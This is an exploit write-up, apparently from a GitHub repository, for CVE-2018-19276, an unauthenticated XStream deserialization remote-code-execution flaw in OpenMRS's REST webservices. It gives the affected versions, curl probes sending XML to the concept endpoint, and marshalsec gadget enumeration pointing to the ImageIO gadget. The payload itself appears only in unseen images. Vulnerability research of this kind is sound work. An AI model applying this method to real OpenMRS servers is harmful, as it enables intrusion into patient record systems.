# CVE-2018-19276 OpenMRS Insecure Object Deserialization RCE

From https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607

> Insecure object deserialization allows Arbitrary Code Execution without needing to log in. IP restrictions on Webservices module do not prevent this attack.

![image](https://user-images.githubusercontent.com/5891788/54159267-e6174a00-444c-11e9-9e8c-e00ed49be707.png)

* all versions of OpenMRS Platform 2.1.x < 2.1.4
* all versions of OpenMRS Platform 2.0.x < 2.0.8
* all versions of OpenMRS Platform 1.12.x < 1.12.1
* all versions of OpenMRS Reference Application 2.8.x < 2.8.1
* all versions of OpenMRS Reference Application 2.7.x < 2.7.2
* all versions of OpenMRS Reference Application 2.6.x < 2.6.2

Found by Nicolas Serra from Security Associate at Bishop Fox.

### Proof Of Concept

Let's check how the REST webservices of OpenMRS works using the official [documentation](https://wiki.openmrs.org/display/docs/REST+Web+Services+API+For+Clients#RESTWebServicesAPIForClients-SampleRESTcalls):

```
curl -u admin:test -i 'http://localhost:8080/openmrs/ws/rest/v1/concept'
```

Let's check the fix:
* https://github.com/openmrs/openmrs-module-webservices.rest/pull/369
* https://github.com/openmrs/openmrs-module-webservices.rest/pull/372

We can find this information:

![image](https://user-images.githubusercontent.com/5891788/54126089-06bcb100-4407-11e9-85b9-1427bc0fc944.png)
https://github.com/openmrs/openmrs-module-webservices.rest/pull/369#issuecomment-443513473

They basically filter the **Content-type** of POST request when it's XML, so maybe XXE or an Insecure Deserialization :+1: 

Let's check the documentation again:

![image](https://user-images.githubusercontent.com/5891788/54125529-8d708e80-4405-11e9-9961-44ddca733402.png)

Well, this is nice, what append if we send XML to the REST webservice ?

```
> curl -i -s -k  -X $'POST' -H $'Host: 127.0.0.1:8888' -H $'Content-Type: text/xml'  $'http://127.0.0.1:8888/openmrs/ws/rest/v1/concept'

HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=A896A8B1B0092400DBF74E2E8C365949; Path=/openmrs; HttpOnly
Content-Type: application/json;charset=UTF-8
Content-Length: 8980
Date: Mon, 11 Mar 2019 12:58:30 GMT
Connection: close

{"error":{"message":"[ : input contained no data]","code":"com.thoughtworks.xstream.io.xml.XppReader:126","detail":"com.thoughtworks.xstream.io.StreamException:  : input contained no data\n\tat com.thoughtworks.xstream.io.xml.XppReader.pullNextEvent(XppReader.java:126)\n\tat com.thoughtworks.xstream.io.xml.AbstractPullReader.readRealEvent(AbstractPullReader.java:148)\n\tat com.thoughtworks.xstream.io.xml.AbstractPullReader.readEvent(AbstractPullReader.java:141)\n\tat com.thoughtworks.xstream.io.xml.AbstractPullReader.move(AbstractPullReader.java:118)\n\tat com.thoughtworks.xstream.io.xml.AbstractPullReader.moveDown[...]
```
The error give something very interesting : **xstream.XStreamMarshaller**

Let's try to use the awesome tool [marshalsec](https://github.com/mbechler/marshalsec) to trigger an RCE using Java Deserialization.

Let's check available gadget:

```
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream -v 
No gadget type specified, available are [SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin, CommonsConfiguration, LazySearchEnumeration, BindingEnumeration, ServiceLoader, ImageIO, CommonsBeanutils]
```
At this point, I just use the github search on every gadget of **XStream** to find an and occurrence. Only the gadget **ImageIO** look promising:

![image](https://user-images.githubusercontent.com/5891788/54129586-ded14b80-440e-11e9-854b-ca6c59cd5250.png)

Let's try it:

![image](https://user-images.githubusercontent.com/5891788/54157614-f9c0b180-4448-11e9-8f74-9798b47728f6.png)

That it ! 

### Exploit

```
python CVE-2018-19276.py
```

![image](https://user-images.githubusercontent.com/5891788/54159267-e6174a00-444c-11e9-9e8c-e00ed49be707.png)

###  Ressource:
* https://issues.openmrs.org/browse/RESTWS-742
* https://www.bishopfox.com/news/2019/02/openmrs-insecure-object-deserialization/
* https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607
* https://wiki.openmrs.org/display/docs/REST+Web+Services+API+For+Clients#RESTWebServicesAPIForClients-SampleRESTcalls

